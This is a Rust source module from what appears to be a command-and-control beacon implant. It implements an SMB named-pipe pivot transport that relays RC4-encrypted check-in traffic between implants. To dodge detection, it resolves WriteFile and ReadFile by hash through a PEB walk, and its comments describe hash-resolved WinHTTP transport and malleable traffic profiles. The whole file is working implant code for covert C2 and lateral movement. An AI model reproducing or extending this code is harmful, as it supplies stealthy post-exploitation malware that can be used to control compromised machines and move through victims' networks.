//! Transports (port of `src_beacon/src/net/`): HTTP(S) via WinHTTP resolved
//! by hash, SMB named-pipe pivot transport, malleable profile shaping
//! (profiles are embedded at build time, format v2 unchanged).
//!
//! Phase 3 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb;

const H_WRITE_FILE: u64 = fnv1a64(b"WriteFile");
const H_READ_FILE: u64 = fnv1a64(b"ReadFile");

/// One active named-pipe pivot (`link`): the check-in transport runs over
/// this pipe instead of WinHTTP until `unlink`.
pub struct PivotState {
    pub handle: isize,
}

type WriteFn = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const c_void) -> i32;
type ReadFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32;

unsafe fn write_full(write: WriteFn, handle: isize, mut buf: *const u8, mut len: usize) -> bool {
    while len > 0 {
        let mut n: u32 = 0;
        if write(handle, buf, len as u32, &mut n, core::ptr::null()) == 0 || n == 0 {
            return false;
        }
        buf = buf.add(n as usize);
        len -= n as usize;
    }
    true
}

unsafe fn read_full(read: ReadFn, handle: isize, mut buf: *mut u8, mut len: usize) -> bool {
    while len > 0 {
        let mut n: u32 = 0;
        if read(handle, buf, len as u32, &mut n, core::ptr::null()) == 0 || n == 0 {
            return false;
        }
        buf = buf.add(n as usize);
        len -= n as usize;
    }
    true
}

/// One pivot exchange (docs/WIRE.md, pivot section): `u32 LE len || payload`
/// in each direction. `body` is the RC4-encrypted POST body — byte-identical
/// to what the HTTP transport sends; the reply lands in `resp` exactly like
/// a WinHTTP response page (template + encrypted payload).
///
/// # Safety
///
/// `handle` must be an open read/write named-pipe handle; `kernel32` a
/// resolved module base.
pub unsafe fn pipe_exchange(
    kernel32: *mut c_void,
    handle: isize,
    body: &[u8],
    resp: &mut [u8],
) -> Option<usize> {
    let write = peb::find_export(kernel32, H_WRITE_FILE);
    let read = peb::find_export(kernel32, H_READ_FILE);
    if write.is_null() || read.is_null() {
        return None;
    }
    let write: WriteFn = core::mem::transmute(write as *const c_void);
    let read: ReadFn = core::mem::transmute(read as *const c_void);
    let head = (body.len() as u32).to_le_bytes();
    if !write_full(write, handle, head.as_ptr(), 4) {
        return None;
    }
    if !write_full(write, handle, body.as_ptr(), body.len()) {
        return None;
    }
    let mut rl = [0u8; 4];
    if !read_full(read, handle, rl.as_mut_ptr(), 4) {
        return None;
    }
    let rlen = u32::from_le_bytes(rl) as usize;
    if rlen > resp.len() {
        return None;
    }
    if !read_full(read, handle, resp.as_mut_ptr(), rlen) {
        return None;
    }
    Some(rlen)
}
